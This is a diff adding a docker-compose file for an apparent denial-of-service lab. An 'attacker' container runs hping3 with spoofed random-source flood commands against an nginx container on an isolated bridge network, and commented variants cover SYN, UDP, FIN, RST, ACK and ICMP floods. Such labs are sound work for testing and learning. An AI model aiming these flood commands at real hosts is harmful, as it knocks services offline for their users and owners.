@@ -1,0 +1,31 @@
+version: '3'
+services:
+  website:
+    image: nginx
+    volumes:
+      - ./config/website/nginx.conf:/etc/nginx/nginx.conf
+      - ./config/website/data:/usr/share/nginx/html
+    ports:
+      - '80:80'
+    networks:
+      customnetwork:
+        ipv4_address: 172.25.0.10
+  attacker:
+    image: utkudarilmaz/hping3:latest
+    command: --rand-source --flood website -p 80
+#    command: --rand-source -S -q -n --flood website -p 80
+#    command: --rand-source --udp --flood website -p 80
+#    command: --rand-source -F --flood website -p 80
+#    command: --rand-source -R --flood website -p 80
+#    command: --rand-source -PA --flood website -p 80
+#    command: --rand-source -1 --verbose --flood website -p 80
+    networks:
+      customnetwork:
+        ipv4_address: 172.25.0.20
+networks:
+  customnetwork:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 172.25.0.0/16
+          gateway: 172.25.0.1
